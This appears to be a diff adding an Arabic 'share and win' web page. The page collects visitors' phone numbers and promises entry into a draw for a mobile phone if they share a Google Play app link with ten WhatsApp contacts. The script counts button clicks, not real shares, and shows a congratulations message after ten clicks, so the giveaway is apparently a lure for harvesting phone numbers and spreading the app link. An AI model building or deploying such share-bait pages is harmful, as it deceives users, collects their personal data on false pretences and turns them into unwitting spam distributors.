@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شارك واربح</title>
+    <script>
+        let shareCount = 0;
+
+        function registerPhoneNumber() {
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            if (phoneNumber) {
+                fetch('register.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ phoneNumber: phoneNumber })
+                })
+                .then(response => response.text())
+                .then(data => {
+                    document.getElementById('linkSection').style.display = 'block';
+                })
+                .catch(error => console.error('Error:', error));
+            } else {
+                alert('يرجى إدخال رقم الهاتف.');
+            }
+        }
+
+        function shareLink() {
+            const link = "https://play.google.com/store/apps/details?id=alkahtani.yemoney";
+            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(link)}`;
+            window.open(whatsappUrl, '_blank');
+
+            shareCount++;
+            if (shareCount >= 10) {
+                document.getElementById('congratulationsMessage').style.display = 'block';
+            }
+        }
+    </script>
+</head>
+<body>
+    <h1>ادخل السحب واربح جوال!</h1>
+    <div id="registrationSection">
+        <label for="phoneNumber">أدخل رقم هاتفك:</label>
+        <input type="text" id="phoneNumber" name="phoneNumber">
+        <button onclick="registerPhoneNumber()">موافق</button>
+    </div>
+    <div id="linkSection" style="display:none;">
+        <p>شارك هذا الرابط مع 10 أشخاص على الواتساب للدخول في السحب:</p>
+        <p><a href="https://play.google.com/store/apps/details?id=alkahtani.yemoney">https://play.google.com/store/apps/details?id=alkahtani.yemoney</a></p>
+        <button onclick="shareLink()">شارك على الواتساب</button>
+    </div>
+    <div id="congratulationsMessage" style="display:none;">
+        <p>مبروك، لقد دخلت السحب على جوال!</p>
+    </div>
+</body>
+</html>
